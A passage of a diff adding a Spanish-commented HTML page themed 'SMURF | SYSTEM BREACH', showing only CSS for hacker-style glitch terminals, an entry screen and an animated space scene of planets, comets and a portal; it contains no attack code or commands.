@@ -1,0 +1,3262 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
+    <title>SMURF | SYSTEM BREACH</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono:wght@400&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: #000000;
+            color: #00ff00;
+            overflow: hidden;
+            height: 100vh;
+            position: relative;
+            cursor: crosshair;
+        }
+
+        /* Aggressive background effects */
+        .bg-effects {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: 
+                radial-gradient(circle at 20% 80%, #ff0000 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, #00ff00 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, #ffffff 0%, transparent 50%);
+            opacity: 0.1;
+            animation: bg-pulse 3s infinite;
+        }
+
+        @keyframes bg-pulse {
+            0%, 100% { opacity: 0.1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Scanlines */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                transparent 50%,
+                rgba(0, 255, 0, 0.03) 50%
+            );
+            background-size: 100% 4px;
+            animation: scan 0.1s linear infinite;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+
+        /* Terminal */
+        .terminal {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            padding: 10px;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.2;
+            z-index: 2;
+        }
+
+        /* Brutal header - MEJORADO */
+        .header {
+            color: #ff0000;
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 700;
+            text-shadow: 
+                0 0 5px #ff0000,
+                0 0 10px #ff0000,
+                0 0 15px #ff0000;
+            animation: flicker 0.5s infinite alternate;
+        }
+
+        .header .title {
+            font-size: 5rem;
+            margin-bottom: 10px;
+            animation: brutal-glitch 1s infinite;
+            letter-spacing: 8px;
+            font-weight: 900;
+            text-transform: uppercase;
+        }
+
+        @keyframes brutal-glitch {
+            0% { transform: translate(0); filter: hue-rotate(0deg); }
+            10% { transform: translate(-5px, 5px); filter: hue-rotate(90deg); }
+            20% { transform: translate(5px, -5px); filter: hue-rotate(180deg); }
+            30% { transform: translate(-5px, -5px); filter: hue-rotate(270deg); }
+            40% { transform: translate(5px, 5px); filter: hue-rotate(360deg); }
+            50% { transform: translate(-3px, 3px); filter: hue-rotate(45deg); }
+            60% { transform: translate(3px, -3px); filter: hue-rotate(135deg); }
+            70% { transform: translate(-3px, -3px); filter: hue-rotate(225deg); }
+            80% { transform: translate(3px, 3px); filter: hue-rotate(315deg); }
+            90% { transform: translate(-1px, 1px); filter: hue-rotate(180deg); }
+            100% { transform: translate(0); filter: hue-rotate(0deg); }
+        }
+
+        @keyframes flicker {
+            0% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+
+        .subtitle {
+            font-size: 1.5rem;
+            color: #ffffff;
+            text-shadow: 0 0 10px #ffffff;
+            letter-spacing: 3px;
+            font-weight: 600;
+        }
+
+        /* MENSAJE PRINCIPAL - GRANDE Y COLORIDO */
+        .main-message {
+            text-align: center;
+            margin: 40px 0;
+            padding: 20px;
+            background: linear-gradient(45deg, #ff0000, #ff6600, #ffff00, #00ff00, #0066ff, #6600ff, #ff0066);
+            background-size: 400% 400%;
+            animation: rainbow-bg 3s ease infinite;
+            border-radius: 15px;
+            border: 3px solid #ffffff;
+            box-shadow: 
+                0 0 20px #ff0000,
+                0 0 40px #00ff00,
+                0 0 60px #0066ff;
+        }
+
+        .main-message .big-text {
+            font-size: 3rem;
+            font-weight: 900;
+            color: #ffffff;
+            text-shadow: 
+                2px 2px 0px #000000,
+                -2px -2px 0px #000000,
+                2px -2px 0px #000000,
+                -2px 2px 0px #000000,
+                0 0 10px #ffffff,
+                0 0 20px #ffffff,
+                0 0 30px #ffffff;
+            animation: text-glow 2s ease-in-out infinite alternate;
+            letter-spacing: 2px;
+            line-height: 1.2;
+        }
+
+        @keyframes rainbow-bg {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes text-glow {
+            0% { 
+                transform: scale(1);
+                text-shadow: 
+                    2px 2px 0px #000000,
+                    -2px -2px 0px #000000,
+                    2px -2px 0px #000000,
+                    -2px 2px 0px #000000,
+                    0 0 10px #ffffff,
+                    0 0 20px #ffffff,
+                    0 0 30px #ffffff;
+            }
+            100% { 
+                transform: scale(1.05);
+                text-shadow: 
+                    2px 2px 0px #000000,
+                    -2px -2px 0px #000000,
+                    2px -2px 0px #000000,
+                    -2px 2px 0px #000000,
+                    0 0 15px #ffffff,
+                    0 0 30px #ffffff,
+                    0 0 45px #ffffff,
+                    0 0 60px #ff0000;
+            }
+        }
+
+        /* Command styling */
+        .cmd-line {
+            margin: 3px 0;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .prompt {
+            color: #ff0000;
+            margin-right: 5px;
+            font-weight: 700;
+            min-width: 160px;
+            text-shadow: 0 0 5px #ff0000;
+        }
+
+        .command {
+            color: #ffffff;
+            font-weight: 400;
+            text-shadow: 0 0 3px #ffffff;
+        }
+
+        .output {
+            color: #00ff00;
+            margin: 1px 0 8px 165px;
+            white-space: pre-wrap;
+            text-shadow: 0 0 3px #00ff00;
+        }
+
+        .output.error {
+            color: #ff0000;
+            text-shadow: 0 0 5px #ff0000;
+        }
+
+        .output.warning {
+            color: #ffff00;
+            text-shadow: 0 0 5px #ffff00;
+        }
+
+        .output.success {
+            color: #00ff00;
+            text-shadow: 0 0 5px #00ff00;
+            animation: success-pulse 0.5s;
+        }
+
+        @keyframes success-pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        /* Cursor */
+        .cursor {
+            background: #00ff00;
+            color: #000000;
+            animation: cursor-blink 0.8s infinite;
+            box-shadow: 0 0 5px #00ff00;
+        }
+
+        @keyframes cursor-blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        /* Scrollbar */
+        .terminal::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .terminal::-webkit-scrollbar-track {
+            background: #000000;
+            border: 1px solid #ff0000;
+        }
+
+        .terminal::-webkit-scrollbar-thumb {
+            background: #ff0000;
+            box-shadow: 0 0 5px #ff0000;
+        }
+
+        /* Glitch effects */
+        .glitch {
+            animation: glitch-effect 0.3s infinite;
+        }
+
+        @keyframes glitch-effect {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .terminal {
+                font-size: 11px;
+                padding: 5px;
+            }
+            
+            .header .title {
+                font-size: 3rem;
+            }
+            
+            .main-message .big-text {
+                font-size: 1.8rem;
+            }
+            
+            .prompt {
+                min-width: 120px;
+            }
+            
+            .output {
+                margin-left: 125px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header .title {
+                font-size: 2rem;
+            }
+            
+            .main-message .big-text {
+                font-size: 1.2rem;
+            }
+        }
+        /* Pantalla de entrada */
+        .entry-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 1s ease-out;
+        }
+
+        .entry-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .entry-title {
+            font-size: 6rem;
+            color: #ff0000;
+            text-shadow: 
+                0 0 10px #ff0000,
+                0 0 20px #ff0000,
+                0 0 30px #ff0000;
+            animation: entry-glitch 2s infinite;
+            margin-bottom: 30px;
+            letter-spacing: 10px;
+            font-weight: 900;
+        }
+
+        .entry-subtitle {
+            font-size: 1.8rem;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 50px;
+            letter-spacing: 3px;
+            animation: text-flicker 1.5s infinite;
+        }
+
+        .entry-button {
+            padding: 20px 40px;
+            font-size: 2rem;
+            font-family: 'Share Tech Mono', monospace;
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: #ffffff;
+            border: 3px solid #ffffff;
+            border-radius: 10px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            box-shadow: 
+                0 0 20px #ff0000,
+                inset 0 0 20px rgba(255, 255, 255, 0.1);
+            animation: button-pulse 2s infinite;
+        }
+
+        .entry-button:hover {
+            transform: scale(1.1);
+            background: linear-gradient(45deg, #ff6600, #ffff00);
+            box-shadow: 
+                0 0 30px #ff0000,
+                0 0 50px #ff6600,
+                inset 0 0 30px rgba(255, 255, 255, 0.2);
+        }
+
+        .entry-button:active {
+            transform: scale(0.95);
+        }
+
+        @keyframes entry-glitch {
+            0% { transform: translate(0); filter: hue-rotate(0deg); }
+            10% { transform: translate(-3px, 3px); filter: hue-rotate(90deg); }
+            20% { transform: translate(3px, -3px); filter: hue-rotate(180deg); }
+            30% { transform: translate(-3px, -3px); filter: hue-rotate(270deg); }
+            40% { transform: translate(3px, 3px); filter: hue-rotate(360deg); }
+            50% { transform: translate(0); filter: hue-rotate(0deg); }
+            100% { transform: translate(0); filter: hue-rotate(0deg); }
+        }
+
+        @keyframes text-flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        @keyframes button-pulse {
+            0%, 100% { 
+                box-shadow: 
+                    0 0 20px #ff0000,
+                    inset 0 0 20px rgba(255, 255, 255, 0.1);
+            }
+            50% { 
+                box-shadow: 
+                    0 0 40px #ff0000,
+                    0 0 60px #ff6600,
+                    inset 0 0 30px rgba(255, 255, 255, 0.2);
+            }
+        }
+
+        .warning-text {
+            position: absolute;
+            bottom: 50px;
+            color: #ffff00;
+            font-size: 1rem;
+            text-align: center;
+            animation: warning-blink 1s infinite;
+            letter-spacing: 2px;
+        }
+
+        @keyframes warning-blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+
+        /* Ocultar contenido principal inicialmente */
+        .main-content {
+            display: none;
+        }
+
+        .main-content.active {
+            display: block;
+        }
+
+        /* CAOS DE TERMINALES */
+        .chaos-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 500;
+            display: none;
+            overflow: hidden;
+        }
+
+        .chaos-container.active {
+            display: block;
+        }
+
+        .chaos-terminal {
+            position: absolute;
+            background: rgba(0, 0, 0, 0.95);
+            border-radius: 8px;
+            padding: 0;
+            font-family: 'Share Tech Mono', monospace;
+            width: 90vw;
+            height: 85vh;
+            max-width: 1200px;
+            max-height: 800px;
+            overflow: hidden;
+            backdrop-filter: blur(2px);
+            will-change: transform, opacity, filter;
+            transform-style: preserve-3d;
+            opacity: 0;
+            transform: scale(0.8);
+            animation: terminal-spawn-realistic 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+
+        .chaos-terminal.disappearing {
+            animation: terminal-fade-out 8s linear forwards;
+        }
+
+        /* Diferentes temas para cada terminal */
+        .chaos-terminal.theme-1 {
+            border: 2px solid #ff0000;
+            box-shadow: 0 0 30px #ff0000, inset 0 0 20px rgba(255, 0, 0, 0.1);
+            color: #00ff00;
+        }
+
+        .chaos-terminal.theme-2 {
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 30px #00ff00, inset 0 0 20px rgba(0, 255, 0, 0.1);
+            color: #ff0000;
+        }
+
+        .chaos-terminal.theme-3 {
+            border: 2px solid #0099ff;
+            box-shadow: 0 0 30px #0099ff, inset 0 0 20px rgba(0, 153, 255, 0.1);
+            color: #ffff00;
+        }
+
+        .chaos-terminal.theme-4 {
+            border: 2px solid #ff6600;
+            box-shadow: 0 0 30px #ff6600, inset 0 0 20px rgba(255, 102, 0, 0.1);
+            color: #00ffff;
+        }
+
+        .chaos-terminal.theme-5 {
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 30px #ff00ff, inset 0 0 20px rgba(255, 0, 255, 0.1);
+            color: #ffffff;
+        }
+
+        .chaos-terminal.theme-6 {
+            border: 2px solid #ffff00;
+            box-shadow: 0 0 30px #ffff00, inset 0 0 20px rgba(255, 255, 0, 0.1);
+            color: #ff0099;
+        }
+
+        .chaos-terminal.theme-7 {
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 30px #00ffff, inset 0 0 20px rgba(0, 255, 255, 0.1);
+            color: #ff6600;
+        }
+
+        .chaos-terminal.theme-8 {
+            border: 2px solid #9900ff;
+            box-shadow: 0 0 30px #9900ff, inset 0 0 20px rgba(153, 0, 255, 0.1);
+            color: #00ff99;
+        }
+
+        .chaos-terminal.theme-9 {
+            border: 2px solid #ff9900;
+            box-shadow: 0 0 30px #ff9900, inset 0 0 20px rgba(255, 153, 0, 0.1);
+            color: #9900ff;
+        }
+
+        /* Fondo espacial con estrellas y galaxia */
+        .heaven-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                /* Estrellas pequeñas */
+                radial-gradient(2px 2px at 20px 30px, #fff, transparent),
+                radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
+                radial-gradient(1px 1px at 90px 40px, #fff, transparent),
+                radial-gradient(1px 1px at 130px 80px, rgba(255,255,255,0.6), transparent),
+                radial-gradient(2px 2px at 160px 30px, #ddd, transparent),
+                radial-gradient(1px 1px at 200px 120px, #fff, transparent),
+                radial-gradient(2px 2px at 250px 60px, rgba(255,255,255,0.7), transparent),
+                radial-gradient(1px 1px at 300px 100px, #fff, transparent),
+                /* Galaxia central */
+                radial-gradient(ellipse at center,
+                    rgba(138, 43, 226, 0.8) 0%,
+                    rgba(75, 0, 130, 0.6) 25%,
+                    rgba(25, 25, 112, 0.4) 50%,
+                    rgba(0, 0, 0, 0.8) 75%,
+                    rgba(0, 0, 0, 1) 100%
+                ),
+                /* Fondo espacial profundo */
+                linear-gradient(45deg,
+                    #000000 0%,
+                    #0f0f23 25%,
+                    #1a1a2e 50%,
+                    #16213e 75%,
+                    #0f3460 100%
+                );
+            background-size: 
+                200px 100px, 300px 150px, 250px 120px, 180px 90px, 220px 110px,
+                280px 140px, 320px 160px, 240px 120px,
+                100% 100%, 100% 100%;
+            opacity: 0;
+            z-index: 100;
+            animation: space-appear-gradual 12s ease-in-out forwards, stars-twinkle 4s ease-in-out infinite;
+        }
+
+        /* Agujero negro / Nebulosa central */
+        .heaven-background::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle,
+                rgba(138, 43, 226, 1) 0%,
+                rgba(75, 0, 130, 0.9) 15%,
+                rgba(25, 25, 112, 0.7) 30%,
+                rgba(0, 0, 0, 0.8) 50%,
+                rgba(0, 0, 0, 0.4) 70%,
+                transparent 100%
+            );
+            transform: translate(-50%, -50%);
+            animation: cosmic-vortex 10s ease-in-out infinite;
+        }
+
+        @keyframes terminal-spawn-realistic {
+            0% { 
+                opacity: 0;
+                transform: scale(0.8) translateY(20px);
+                filter: blur(5px);
+            }
+            30% {
+                opacity: 0.3;
+                transform: scale(0.9) translateY(10px);
+                filter: blur(3px);
+            }
+            60% {
+                opacity: 0.7;
+                transform: scale(0.95) translateY(5px);
+                filter: blur(1px);
+            }
+            100% { 
+                opacity: 1;
+                transform: scale(1) translateY(0);
+                filter: blur(0px);
+            }
+        }
+
+        @keyframes terminal-fade-out {
+            0% { 
+                opacity: 1;
+                filter: blur(0px);
+            }
+            25% {
+                opacity: 0.8;
+                filter: blur(1px);
+            }
+            50% {
+                opacity: 0.6;
+                filter: blur(2px);
+            }
+            75% {
+                opacity: 0.3;
+                filter: blur(4px);
+            }
+            100% { 
+                opacity: 0;
+                filter: blur(8px);
+            }
+        }
+
+        @keyframes space-appear-gradual {
+            0% { 
+                opacity: 0;
+                filter: blur(20px) brightness(0.1);
+            }
+            15% {
+                opacity: 0.1;
+                filter: blur(15px) brightness(0.2);
+            }
+            30% {
+                opacity: 0.25;
+                filter: blur(12px) brightness(0.4);
+            }
+            45% {
+                opacity: 0.4;
+                filter: blur(8px) brightness(0.6);
+            }
+            60% {
+                opacity: 0.6;
+                filter: blur(5px) brightness(0.8);
+            }
+            75% {
+                opacity: 0.8;
+                filter: blur(3px) brightness(0.9);
+            }
+            90% {
+                opacity: 0.95;
+                filter: blur(1px) brightness(1);
+            }
+            100% { 
+                opacity: 1;
+                filter: blur(0px) brightness(1);
+            }
+        }
+
+        @keyframes cosmic-vortex {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1) rotate(0deg);
+                opacity: 0.8;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.3) rotate(180deg);
+                opacity: 1;
+            }
+        }
+
+        @keyframes stars-twinkle {
+            0%, 100% { 
+                filter: brightness(1);
+            }
+            50% { 
+                filter: brightness(1.5);
+            }
+        }
+
+        @keyframes music-button-pulse {
+            0%, 100% { 
+                transform: translate(-50%, -50%) scale(1);
+                box-shadow: 0 0 20px rgba(255,0,0,0.8);
+            }
+            50% { 
+                transform: translate(-50%, -50%) scale(1.1);
+                box-shadow: 0 0 30px rgba(255,255,0,1);
+            }
+        }
+
+        /* EFECTO FINAL REVOLUCIONARIO - UNIVERSO REALISTA */
+        .revolutionary-finale {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10000;
+            opacity: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        /* FONDO DEL UNIVERSO PROFUNDO */
+        .deep-universe-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(ellipse at 20% 50%, rgba(120, 0, 255, 0.3) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(255, 0, 150, 0.3) 0%, transparent 50%),
+                radial-gradient(ellipse at 40% 80%, rgba(0, 255, 200, 0.2) 0%, transparent 50%),
+                linear-gradient(135deg, #000011 0%, #000033 25%, #000055 50%, #000022 75%, #000000 100%);
+        }
+
+        .revolutionary-finale.active {
+            opacity: 1;
+            animation: reality-hack 8s ease-in-out forwards;
+        }
+
+        @keyframes reality-hack {
+            0% { 
+                opacity: 0;
+                filter: blur(20px);
+            }
+            20% { 
+                opacity: 1;
+                filter: blur(0px);
+            }
+            100% { 
+                opacity: 1;
+                filter: blur(0px);
+            }
+        }
+
+        /* NEBULOSAS REALISTAS */
+        .nebula {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(3px);
+            animation: nebula-drift 20s linear infinite;
+        }
+
+        .nebula-1 {
+            width: 300px;
+            height: 200px;
+            top: 10%;
+            left: 15%;
+            background: radial-gradient(ellipse, rgba(255, 100, 200, 0.4) 0%, rgba(150, 0, 255, 0.2) 50%, transparent 100%);
+            animation-duration: 25s;
+        }
+
+        .nebula-2 {
+            width: 250px;
+            height: 180px;
+            top: 60%;
+            right: 20%;
+            background: radial-gradient(ellipse, rgba(0, 255, 150, 0.3) 0%, rgba(0, 150, 255, 0.2) 50%, transparent 100%);
+            animation-duration: 30s;
+            animation-direction: reverse;
+        }
+
+        .nebula-3 {
+            width: 200px;
+            height: 150px;
+            top: 30%;
+            right: 10%;
+            background: radial-gradient(ellipse, rgba(255, 200, 0, 0.3) 0%, rgba(255, 100, 0, 0.2) 50%, transparent 100%);
+            animation-duration: 35s;
+        }
+
+        @keyframes nebula-drift {
+            0% { transform: translateX(0) rotate(0deg); }
+            100% { transform: translateX(50px) rotate(360deg); }
+        }
+
+        /* GALAXIAS ESPIRALES */
+        .galaxy {
+            position: absolute;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            animation: galaxy-rotate 40s linear infinite;
+        }
+
+        .galaxy-1 {
+            top: 20%;
+            right: 30%;
+            background: 
+                radial-gradient(ellipse at center, rgba(255, 255, 255, 0.8) 0%, rgba(255, 200, 100, 0.4) 30%, rgba(100, 150, 255, 0.2) 60%, transparent 100%),
+                conic-gradient(from 0deg, transparent 0%, rgba(255, 255, 255, 0.3) 10%, transparent 20%, rgba(255, 255, 255, 0.3) 30%, transparent 40%, rgba(255, 255, 255, 0.3) 50%, transparent 60%, rgba(255, 255, 255, 0.3) 70%, transparent 80%, rgba(255, 255, 255, 0.3) 90%, transparent 100%);
+        }
+
+        .galaxy-2 {
+            bottom: 25%;
+            left: 25%;
+            background: 
+                radial-gradient(ellipse at center, rgba(255, 150, 255, 0.6) 0%, rgba(150, 100, 255, 0.3) 30%, rgba(100, 200, 255, 0.2) 60%, transparent 100%),
+                conic-gradient(from 45deg, transparent 0%, rgba(255, 150, 255, 0.4) 15%, transparent 30%, rgba(255, 150, 255, 0.4) 45%, transparent 60%, rgba(255, 150, 255, 0.4) 75%, transparent 90%);
+            animation-direction: reverse;
+            animation-duration: 50s;
+        }
+
+        @keyframes galaxy-rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* SISTEMA SOLAR */
+        .solar-system {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px;
+            height: 600px;
+        }
+
+        /* SOL */
+        .sun {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: radial-gradient(circle, #ffff00 0%, #ff8800 50%, #ff4400 100%);
+            border-radius: 50%;
+            box-shadow: 0 0 30px #ffff00, 0 0 60px #ff8800;
+            animation: sun-pulse 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes sun-pulse {
+            0% { 
+                transform: translate(-50%, -50%) scale(1);
+                box-shadow: 0 0 30px #ffff00, 0 0 60px #ff8800;
+            }
+            100% { 
+                transform: translate(-50%, -50%) scale(1.2);
+                box-shadow: 0 0 40px #ffff00, 0 0 80px #ff8800, 0 0 120px #ff4400;
+            }
+        }
+
+        /* ÓRBITAS DE PLANETAS */
+        .planet-orbit {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .mercury-orbit { width: 80px; height: 80px; animation: orbit 8s linear infinite; }
+        .venus-orbit { width: 100px; height: 100px; animation: orbit 12s linear infinite; }
+        .earth-orbit { width: 130px; height: 130px; animation: orbit 16s linear infinite; }
+        .mars-orbit { width: 160px; height: 160px; animation: orbit 20s linear infinite; }
+        .jupiter-orbit { width: 220px; height: 220px; animation: orbit 30s linear infinite; }
+        .saturn-orbit { width: 280px; height: 280px; animation: orbit 40s linear infinite; }
+        .uranus-orbit { width: 340px; height: 340px; animation: orbit 50s linear infinite; }
+        .neptune-orbit { width: 400px; height: 400px; animation: orbit 60s linear infinite; }
+
+        @keyframes orbit {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* PLANETAS */
+        .planet {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            border-radius: 50%;
+            transform: translateX(-50%);
+        }
+
+        .mercury { 
+            width: 6px; height: 6px; 
+            background: radial-gradient(circle, #8c7853 0%, #5c5c5c 100%);
+        }
+
+        .venus { 
+            width: 8px; height: 8px; 
+            background: radial-gradient(circle, #ffc649 0%, #ff8c00 100%);
+        }
+
+        .earth { 
+            width: 10px; height: 10px; 
+            background: radial-gradient(circle, #6b93d6 0%, #4a90e2 50%, #2e7d32 100%);
+            position: relative;
+        }
+
+        .moon {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: #cccccc;
+            border-radius: 50%;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: moon-orbit 2s linear infinite;
+        }
+
+        @keyframes moon-orbit {
+            0% { transform: translateX(-50%) rotate(0deg) translateX(15px) rotate(0deg); }
+            100% { transform: translateX(-50%) rotate(360deg) translateX(15px) rotate(-360deg); }
+        }
+
+        .mars { 
+            width: 8px; height: 8px; 
+            background: radial-gradient(circle, #cd5c5c 0%, #8b0000 100%);
+        }
+
+        .jupiter { 
+            width: 20px; height: 20px; 
+            background: radial-gradient(circle, #d8ca9d 0%, #fad5a5 50%, #b8860b 100%);
+        }
+
+        .saturn { 
+            width: 16px; height: 16px; 
+            background: radial-gradient(circle, #fab27b 0%, #daa520 100%);
+            position: relative;
+        }
+
+        .saturn-rings {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 24px;
+            height: 24px;
+            border: 2px solid rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            border-top: 2px solid transparent;
+            border-bottom: 2px solid transparent;
+        }
+
+        .uranus { 
+            width: 12px; height: 12px; 
+            background: radial-gradient(circle, #4fd0e7 0%, #4169e1 100%);
+        }
+
+        .neptune { 
+            width: 12px; height: 12px; 
+            background: radial-gradient(circle, #4b70dd 0%, #000080 100%);
+        }
+
+        /* ESTRELLAS REALISTAS */
+        .realistic-stars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .star {
+            position: absolute;
+            border-radius: 50%;
+            animation: star-twinkle 3s ease-in-out infinite alternate;
+        }
+
+        .star-big {
+            width: 4px;
+            height: 4px;
+            background: radial-gradient(circle, #ffffff 0%, #ffff88 100%);
+            box-shadow: 0 0 10px #ffffff;
+        }
+
+        .star-medium {
+            width: 2px;
+            height: 2px;
+            background: radial-gradient(circle, #ffffff 0%, #88ffff 100%);
+            box-shadow: 0 0 6px #ffffff;
+        }
+
+        .star-small {
+            width: 1px;
+            height: 1px;
+            background: #ffffff;
+            box-shadow: 0 0 3px #ffffff;
+        }
+
+        .star-1 { top: 15%; left: 10%; animation-delay: 0s; }
+        .star-2 { top: 25%; left: 85%; animation-delay: 0.5s; }
+        .star-3 { top: 45%; left: 20%; animation-delay: 1s; }
+        .star-4 { top: 65%; left: 75%; animation-delay: 1.5s; }
+        .star-5 { top: 80%; left: 30%; animation-delay: 2s; }
+        .star-6 { top: 35%; left: 60%; animation-delay: 2.5s; }
+        .star-7 { top: 55%; left: 90%; animation-delay: 0.3s; }
+        .star-8 { top: 75%; left: 15%; animation-delay: 0.8s; }
+        .star-9 { top: 20%; left: 45%; animation-delay: 1.3s; }
+        .star-10 { top: 90%; left: 65%; animation-delay: 1.8s; }
+
+        @keyframes star-twinkle {
+            0% { 
+                opacity: 0.3;
+                transform: scale(1);
+            }
+            100% { 
+                opacity: 1;
+                transform: scale(1.5);
+            }
+        }
+
+        /* COMETAS */
+        .comet {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background: radial-gradient(circle, #ffffff 0%, #88ffff 100%);
+            border-radius: 50%;
+            box-shadow: 0 0 15px #88ffff;
+        }
+
+        .comet::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 100%;
+            width: 40px;
+            height: 2px;
+            background: linear-gradient(90deg, rgba(136, 255, 255, 0.8) 0%, transparent 100%);
+            transform: translateY(-50%);
+        }
+
+        .comet-1 {
+            top: 20%;
+            left: -50px;
+            animation: comet-fly 8s linear infinite;
+        }
+
+        .comet-2 {
+            top: 70%;
+            left: -50px;
+            animation: comet-fly 12s linear infinite;
+            animation-delay: 4s;
+        }
+
+        @keyframes comet-fly {
+            0% { 
+                left: -50px;
+                opacity: 0;
+            }
+            10% { 
+                opacity: 1;
+            }
+            90% { 
+                opacity: 1;
+            }
+            100% { 
+                left: calc(100% + 50px);
+                opacity: 0;
+            }
+        }
+
+        /* ASTEROIDES */
+        .asteroid {
+            position: absolute;
+            background: radial-gradient(circle, #666666 0%, #333333 100%);
+            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
+            animation: asteroid-drift 15s linear infinite;
+        }
+
+        .asteroid-1 {
+            width: 8px;
+            height: 6px;
+            top: 30%;
+            left: -20px;
+            animation-duration: 20s;
+        }
+
+        .asteroid-2 {
+            width: 6px;
+            height: 8px;
+            top: 60%;
+            left: -20px;
+            animation-duration: 25s;
+            animation-delay: 5s;
+        }
+
+        .asteroid-3 {
+            width: 10px;
+            height: 7px;
+            top: 80%;
+            left: -20px;
+            animation-duration: 18s;
+            animation-delay: 10s;
+        }
+
+        @keyframes asteroid-drift {
+            0% { 
+                left: -20px;
+                transform: rotate(0deg);
+            }
+            100% { 
+                left: calc(100% + 20px);
+                transform: rotate(360deg);
+            }
+        }
+
+        /* PORTAL DIMENSIONAL MEJORADO */
+        .dimensional-portal {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 200px;
+            z-index: 10001;
+        }
+
+        .portal-ring {
+            position: absolute;
+            border-radius: 50%;
+            border: 3px solid;
+            animation: portal-spin 3s linear infinite;
+        }
+
+        .portal-ring-1 {
+            width: 100%;
+            height: 100%;
+            border-color: #ff00ff;
+            animation-duration: 2s;
+        }
+
+        .portal-ring-2 {
+            width: 70%;
+            height: 70%;
+            top: 15%;
+            left: 15%;
+            border-color: #00ffff;
+            animation-duration: 1.5s;
+            animation-direction: reverse;
+        }
+
+        .portal-ring-3 {
+            width: 40%;
+            height: 40%;
